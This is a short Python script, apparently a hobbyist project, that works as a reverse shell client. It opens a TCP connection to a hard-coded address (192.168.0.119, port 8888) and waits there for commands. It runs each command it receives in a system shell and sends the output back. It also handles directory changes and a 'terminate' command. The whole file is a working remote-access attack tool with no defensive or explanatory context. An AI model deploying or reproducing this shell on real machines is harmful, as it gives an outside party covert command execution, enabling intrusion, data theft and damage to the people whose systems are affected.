#!/usr/bin/env python3

import socket
import subprocess as sp
import os
host, port = ("192.168.0.119", 8888) # 192.168.0.123
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPV4 = AF_INET || IPV6 = AF_INET6
s.connect((host, port))


while True:
    result = s.recv(1024)
    result = result.decode()
    if result == "terminate":
        break
    elif result[:2] == "cd":
        if result[3:] != "":
            os.chdir(result[3:])
            s.sendall(b"mouved\necho %cd% to se were are u")
        else :
            s.sendall(b"no dir specified")
    elif result == "":
        s.sendall(b"nothin is send")
    else :
        output = sp.Popen(result, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
        out, err = output.communicate()
        print(out)
        print(err)
        S = b''
        if out != b'':
            S = S + out
        if err != b'':
            S = S + err
        if S != b'':
            s.sendall(S)
        else:
            s.sendall(b'Nothing to say')
s.close() 
